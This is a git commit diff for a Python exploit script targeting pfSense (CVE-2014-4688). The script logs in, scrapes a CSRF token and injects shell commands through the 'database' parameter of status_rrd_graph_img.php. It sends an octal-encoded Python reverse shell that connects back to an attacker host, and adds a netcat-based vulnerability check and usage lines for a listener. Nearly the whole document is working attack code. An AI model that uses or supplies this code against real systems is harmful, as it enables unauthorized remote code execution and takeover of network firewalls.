c8640a8f65a16144c87a9c7e83baded44ab71cc9
cocomelonc <cocomelonkz@gmail.com>
2020-06-21 14:45:33 +0600

    CVE-2014-4688: update python reverse shell payload

--- cve_2014_4688.py
+++ cve_2014_4688.py
@@ -4,6 +4,7 @@ import urllib3
 import urllib
 import collections
 import sys
+import lxml.html
 from log_colors import *
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -37,14 +38,22 @@ class CVE2014_4688:
     def get_csrf_token(self):
         print (LogColors.BLUE + "get csrf token..." + LogColors.ENDC)
         try:
-            r = self.session.get(self.login_url, verify = False)
+            r = self.session.get(self.login_url,
+                headers = self.headers, verify = False, allow_redirects = False
+            )
             if r.ok:
-                i = r.text.find("csrfMagicToken")
-                csrf = r.text[i:i + 128].split('"')[-1]
-                self.csrf = csrf
-                print (LogColors.YELLOW + "csrf: " + csrf + "..." + LogColors.ENDC)
+                csrf = self.parse_csrf(r.text)
         except Exception:
             print (LogColors.RED + "error parse csrf :(" + LogColors.ENDC)
+
+    # parse csrf token from html page
+    def parse_csrf(self, html):
+        tree = lxml.html.fromstring(html)
+        csrf = tree.xpath(".//form[@id='iform']//input[contains(@name, '__csrf_magic')]/@value")
+        if csrf:
+            self.csrf = csrf[0].split(";")[0]
+        print (LogColors.YELLOW + "csrf: " + self.csrf + "..." + LogColors.ENDC)
+        return self.csrf
 
     # login
     def login(self):
@@ -56,23 +65,26 @@ class CVE2014_4688:
             "passwordfld" : self.pswd,
             "login" : "Login",
         }
-        data = collections.OrderedDict(data)
-        data = urllib.parse.urlencode(data)
         r = self.session.post(
             self.login_url,
-            data = data, headers = self.headers, verify = False,
-            cookies = self.session.cookies
+            data = data,
+            verify = False,
         )
-        if r.ok and "/index.php?logout" in r.text:
+        if r.status_code == 200 and "Username" not in r.text:
+            self.parse_csrf(r.text)
             print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
         else:
-            print (LogColors.RED + "error login..." + LogColors.ENDC)
+            if r.status_code == 404 and "CSRF" in r.text:
+                print (LogColors.RED + "login failed. incorrect csrf..." + LogColors.ENDC)
+            else:
+                print (LogColors.RED + "error login..." + LogColors.ENDC)
             sys.exit()
 
     # generate payload
     def generate_payload(self):
         print (LogColors.BLUE + "generate payload..." + LogColors.ENDC)
-        cmd = "python -c 'import socket,subprocess,os;"
+        cmd = ""
+        cmd += "python -c 'import socket,subprocess,os;"
         cmd += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
         cmd += 's.connect(("' + self.lhost + '",' + self.lport + '));'
         cmd += 'os.dup2(s.fileno(),0);'
@@ -84,15 +96,29 @@ class CVE2014_4688:
         for c in cmd:
             payload += ("\\" + oct(ord(c)).lstrip("0o"))
 
+        payload = "\\12" + payload + "\\47\\12"
         return payload
+
+    # check injection
+    def check(self):
+        check_url = "https://" + self.rhost + "/status_rrd_graph_img.php"
+        check_url += "?database=queues;echo+'hello'+|nc+" + self.lhost + "+" + self.lport
+        r = self.session.get(check_url, verify = False)
+        if r.ok:
+            print (LogColors.GREEN + "pfsense is vulnerable. hackable :)" + LogColors.ENDC)
+            return True
+        return False
 
     # exploit
     def run(self):
         self.login()
+        #self.check()
         print (LogColors.BLUE + "running exploit..." + LogColors.ENDC)
         payload = self.generate_payload()
         exploit_url = "https://" + self.rhost + "/status_rrd_graph_img.php?"
         exploit_url += "database=queues;" + "printf+" + "'" + payload + "'|sh"
+
+        exploit_url = "https://" + self.rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"
         print (LogColors.YELLOW + "exploit: " + exploit_url + LogColors.ENDC)
         try:
             r = self.session.get(exploit_url,
@@ -100,17 +126,18 @@ class CVE2014_4688:
             )
             if r.status_code:
                 print (LogColors.RED + "failed running exploit :(" + LogColors.ENDC)
-            else:
-                print (LogColors.GREEN + "successfully exploited. hacked :)" + LogColors.ENDC)
-                print (LogColors.GREEN + "check shell on " + self.lhost + ":" + self.lport + LogColors.ENDC)
         except Exception as e:
-            print (LogColors.RED + "failed running exploit :(" + LogColors.ENDC)
+            print (LogColors.GREEN + "successfully exploited. hacked :)" + LogColors.ENDC)
+            print (LogColors.GREEN + "check shell on " + self.lhost + ":" + self.lport + LogColors.ENDC)
 
 if __name__ == '__main__':
+    print (LogColors.GREEN + "Usage:" + LogColors.ENDC)
+    print (LogColors.GREEN + "$>nc -nlvp 10.10.14.12 4444" + LogColors.ENDC)
+    print (LogColors.GREEN + "$>python cve_2014_4688.py --lhost 10.10.6.17 --lport 4444 --target 10.10.10.50 --username pfsense --password pfsense" + LogColors.ENDC)
     parser = argparse.ArgumentParser()
     parser.add_argument('-t','--target', required = True, help = "target victim host/ip")
-    parser.add_argument('-l','--lhost', required = True, help = "my shell host")
-    parser.add_argument('-p', '--lport', required = True, help = "my shell port")
+    parser.add_argument('-l','--lhost', required = True, help = "local listener host")
+    parser.add_argument('-p', '--lport', required = True, help = "local listener port")
     parser.add_argument('-u', '--username', required = True, help = "pfsense username")
     parser.add_argument('-s', '--password', required = True, help = "pfsense password")
     args = vars(parser.parse_args())
